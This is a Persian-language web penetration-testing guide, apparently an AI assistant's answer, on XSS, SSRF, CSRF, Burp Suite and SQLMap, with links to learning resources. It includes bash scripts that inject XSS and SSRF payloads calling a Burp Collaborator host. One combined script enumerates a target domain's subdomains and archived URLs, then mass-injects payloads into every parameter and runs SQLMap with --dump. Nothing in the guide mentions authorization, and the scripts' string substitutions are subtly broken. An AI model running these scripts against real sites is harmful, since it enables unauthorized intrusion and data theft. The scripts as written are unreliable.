با توجه به علاقه‌مندی شما به یادگیری و استفاده حرفه‌ای از ابزارهای تست نفوذ وب، در ادامه یک برنامه جامع و مرحله‌به‌مرحله برای هر بخش مهم (XSS، SSRF، CSRF) همراه با اسکریپت‌های تخصصی‌تر و راهنمای تصویری و منابع آموزشی فارسی معتبر ارائه می‌دهم. این برنامه به شما کمک می‌کند فرایند تست نفوذ وب را به بهترین شکل انجام دهید.

1. تست XSS (Cross-Site Scripting)
گام‌های اصلی
شناسایی ورودی‌های آسیب‌پذیر: فرم‌ها، پارامترهای URL، هدرها، کوکی‌ها

تزریق پیلودهای XSS: پیلودهای ساده مثل <script>alert(1)</script> و پیلودهای پیشرفته‌تر

استفاده از Burp Suite Intruder و Repeater برای ارسال و تست پیلودها

استفاده از Burp Collaborator برای شناسایی Blind XSS

تحلیل پاسخ‌ها و لاگ‌ها

نمونه اسکریپت اتوماتیک تزریق XSS با Burp Collaborator
```bash
#!/bin/bash
target=$1
collaborator="your-collaborator-id.burpcollaborator.net"

cat urls.txt | grep '=' | while read url; do
  payload="<script src='https://$collaborator'></script>"
  test_url="${url/=\*/=$payload}"
  curl -s "$test_url" > /dev/null
  echo "Injected payload to $test_url"
done
```
منابع تصویری و فارسی
آموزش کامل Burp Suite و تست XSS در لرن فایلز

ویدیو آموزش XSS با Burp Suite در آپارات

مقاله آموزش XSS با Burp Suite در سایفکس

2. تست SSRF (Server-Side Request Forgery)
گام‌های اصلی
شناسایی پارامترهای URL یا ورودی‌هایی که سرور درخواست HTTP ارسال می‌کند

تزریق آدرس‌های داخلی مثل http://127.0.0.1 یا دامنه Burp Collaborator

استفاده از Burp Collaborator برای شناسایی درخواست‌های ارسالی از سرور

تست دور زدن فیلترها با قالب‌های مختلف آدرس

نمونه پیلود SSRF ساده
```bash
http://target.com/api?url=http://your-collaborator-id.burpcollaborator.net
```
منابع آموزشی
آموزش تست SSRF در PortSwigger

مقاله فارسی آموزش SSRF در سایت امنیتی سایفکس

3. تست CSRF (Cross-Site Request Forgery)
گام‌های اصلی
شناسایی درخواست‌های حساس POST یا GET

حذف یا تغییر هدرهای Origin و Referer و تست واکنش سرور

بررسی وجود توکن CSRF و اعتبارسنجی آن

استفاده از Burp Suite Intruder برای حذف یا تغییر توکن‌ها و بررسی پاسخ

راهنمای تصویری
آموزش تست CSRF با Burp Suite در آپارات (نمونه ویدیویی)

مقاله فارسی تست CSRF در فرادرس

4. راهنمای گام‌به‌گام استفاده پیشرفته Burp Suite
نصب و پیکربندی Proxy و گواهی SSL

استفاده از Repeater برای تست‌های دستی

Intruder برای حملات خودکار و فازی

Collaborator برای تست آسیب‌پذیری‌های Out-of-Band مثل Blind XSS و SSRF

Extender برای افزودن افزونه‌های تخصصی مثل SQLiPy (ادغام SQLMap)

Sequencer برای تحلیل امنیت توکن‌ها

Comparer برای مقایسه درخواست‌ها و پاسخ‌ها

منابع آموزش
دوره ویدیویی کامل Burp Suite در لرن فایلز

مقاله گام‌به‌گام Burp Suite در سایت APK

آموزش افزونه SQLiPy برای ادغام Burp و SQLMap

5. راهنمای گام‌به‌گام استفاده پیشرفته SQLMap
اجرای تست SQLi روی پارامترهای GET و POST

استفاده از گزینه‌های پیشرفته --level, --risk, --technique

بهره‌برداری از دیتابیس و استخراج داده‌ها

اجرای دستورات سیستم عامل در صورت امکان

استفاده از API SQLMap با افزونه SQLiPy در Burp Suite

نمونه دستور پیشرفته
```bash
sqlmap -u "http://target.com/page.php?id=1" --batch --level=5 --risk=3 --dump --threads=10 --random-agent
```
منابع آموزشی
آموزش کامل SQLMap در PentestCore

ویدیو آموزش SQLMap در آپارات

6. اسکریپت ترکیبی پیشرفته برای XSS، SSRF و SQLi
```bash
#!/bin/bash

target=$1
collaborator="your-collaborator-id.burpcollaborator.net"

# زیردامنه‌ها
subfinder -d $target -silent > subdomains.txt

# دامنه‌های زنده
cat subdomains.txt | httpx -silent -threads 50 > live_domains.txt

# استخراج URLها
cat live_domains.txt | waybackurls | sort -u > urls.txt

# تزریق XSS
grep '=' urls.txt | while read url; do
  xss_payload="<script src='https://$collaborator'></script>"
  test_url="${url/=\*/=$xss_payload}"
  curl -s "$test_url" > /dev/null
done

# تست SSRF
grep -E 'url=|redirect=' urls.txt | while read url; do
  ssrf_payload="http://$collaborator"
  test_url="${url/=(*)/=$ssrf_payload}"
  curl -s "$test_url" > /dev/null
done

# تست SQLi با SQLMap
grep '=' urls.txt | while read url; do
  sqlmap -u "$url" --batch --level=3 --risk=2 --threads=10 --random-agent --output-dir=./sqlmap_output
done
```
